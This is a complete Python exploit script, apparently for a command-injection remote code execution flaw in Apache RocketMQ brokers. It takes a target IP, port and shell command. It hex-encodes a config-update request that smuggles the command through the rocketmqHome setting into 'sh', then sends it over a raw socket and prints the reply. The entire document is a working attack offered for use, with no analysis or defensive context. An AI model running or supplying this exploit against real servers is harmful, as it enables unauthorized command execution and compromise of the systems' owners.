#!/usr/bin/env python3
import argparse
import socket

# example usage: exploit.py 127.0.0.1 10911 'touch /tmp/poc_succeed' 
parser = argparse.ArgumentParser()
parser.add_argument('ip', help='RocketMQ broker\'s IP', type=str)
parser.add_argument('port', help='RocketMQ broker\'s port', type=int)
parser.add_argument('command', help='RCE command', type=str)
args = parser.parse_args()

# hex of ...w
request_prefix = '00000077'

# hex of ...`{"code":25,"flag":0,"language":"JAVA","opaque":0,"serializeTypeCurrentRPC":"JSON","version":403}filterServerNums=1\n
request = '000000607b22636f6465223a32352c22666c6167223a302c226c616e6775616765223a224a415641222c226f7061717565223a302c2273657269616c697a655479706543757272656e74525043223a224a534f4e222c2276657273696f6e223a3430337d66696c7465725365727665724e756d733d310a'

# hex of rocketmqHome=-c $@|sh . echo (have 1 space at last char)
rmq_home = '726f636b65746d71486f6d653d2d632024407c7368202e206563686f20'

# hex of ;\n
request_postfix = '3b0a' 

# RCE command
command = args.command

# Construct the payload request
payload_request = bytes.fromhex(request) + bytes.fromhex(rmq_home) + command.encode() + bytes.fromhex(request_postfix)

# Update prefix to fit with new payload request
updated_prefix = request_prefix.replace('77', hex(len(payload_request))[2:])

# Construct the full package to send to Broker
full_package = bytes.fromhex(updated_prefix) + payload_request

# Send and get the response
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
broker_addr = (args.ip, args.port)
sock.connect(broker_addr)

print(full_package)
sock.sendall(full_package)

resp = sock.recv(1024)

print(resp)

sock.close()
